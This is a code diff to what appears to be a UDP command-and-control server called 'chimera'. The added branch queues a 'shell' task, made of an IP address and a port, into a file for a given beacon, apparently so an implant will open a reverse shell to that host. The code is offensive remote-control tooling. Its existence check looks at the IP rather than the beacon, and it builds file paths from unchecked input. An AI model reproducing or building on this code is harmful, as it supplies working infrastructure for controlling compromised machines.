@@ -62,6 +62,27 @@ def run():
                     del(contSplit[0])
                     response = response + contSplit
                     sock.sendto(response.encode(), addr)
+        elif (len(dataSplit) == 4):
+            if (dataSplit[0] == "shell") and (len(dataSplit[1].split('.')) == 4) and ((int(dataSplit[2]) > 0) and (int(dataSplit[2]) <= 510)) and (len(dataSplit[3].split('.')) == 4):
+                if not os.path.exists("/tmp/chimera/" + dataSplit[1]):
+                    sock.sendto("not_found".encode(), addr)
+                else:
+                    ip = dataSplit[1]
+                    port = dataSplit[2]
+                    beacon = dataSplit[3]
+                    
+                    f = open("/tmp/chimera/" + beacon, "r")
+                    cont = f.read()
+                    f.close()
+                    contSplit = cont.split('\n')
+                    contSplit.append("shell")
+                    contSplit.append(ip)
+                    contSplit.append(port)
+                    cont = '\n'.join(contSplit)
+                    f = open("/tmp/chimera/" + beacon, "w")
+                    f.write(cont)
+                    f.close()
+                    sock.sendto("confirm".encode(), addr)
         else:
             pass
             
